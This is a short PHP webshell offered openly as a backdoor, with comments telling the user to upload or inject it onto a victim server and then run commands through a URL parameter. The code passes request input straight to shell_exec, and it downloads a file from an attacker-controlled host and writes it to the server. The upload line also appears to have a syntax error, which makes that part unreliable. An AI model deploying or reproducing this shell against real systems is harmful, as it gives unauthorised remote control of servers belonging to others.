<?php
	//simple php backdoor/webshell.
	//code taken from ippsec. All credit to him(https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA). Change attacking ip and file name. 
	//upload/inject this script to server. Use http://victim.com/evil.php?fexec=ping -c 3 10.10.10.10 to run commands

	if (isset($_REQUEST['fupload'])) {
	file_put_contents($_REQUEST['fupload'], file_get_contents("http://attackingip/evil.file") . $_REQUEST['fupload']));
	};
	if (isset($_REQUEST['fexec'])) {
	echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
?>
